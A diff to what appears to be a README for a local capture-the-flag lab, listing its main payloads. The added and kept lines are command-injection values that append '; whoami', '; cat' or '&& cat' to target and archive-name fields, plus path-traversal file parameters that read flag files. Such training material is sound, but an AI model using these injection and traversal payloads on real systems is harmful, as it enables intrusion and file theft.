@@ -9,11 +9,12 @@ http://127.0.0.1:8090
 ## Payloads principais
 
 ```text
+target: 127.0.0.1; whoami
 target: 127.0.0.1; cat /app/flags/flag1.txt
 target: 127.0.0.1; sleep 5; #
 target: localhost && cat /app/flags/flag2.txt
-file: ../flags/flag3.txt
-file: ../flags/flag4.txt
+file=../flags/flag3.txt
+file=../flags/flag4.txt
 archiveName: backup.tar.gz; cat /app/flags/flag5.txt
 archiveName: backup.tar.gz; cat /app/flags/root.txt
 ```
